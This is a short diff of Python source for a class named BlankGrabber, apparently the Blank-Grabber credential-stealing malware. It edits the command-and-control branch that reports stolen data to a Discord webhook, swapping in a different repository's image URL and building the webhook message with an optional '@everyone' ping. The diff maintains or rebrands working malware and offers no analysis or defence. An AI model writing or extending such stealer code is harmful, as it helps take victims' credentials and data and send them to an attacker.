@@ -1678,7 +1678,7 @@ class BlankGrabber:
 
         match Settings.C2[0]:
             case 0: # Discord Webhook
-                image_url = "https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png"
+                image_url = "https://github.com/KaisarYetiandi/Hongmeng/blob/main/.github/workflows/image.png"
 
                 payload = {
                     "content": "||@everyone||" if Settings.PingMe else "",
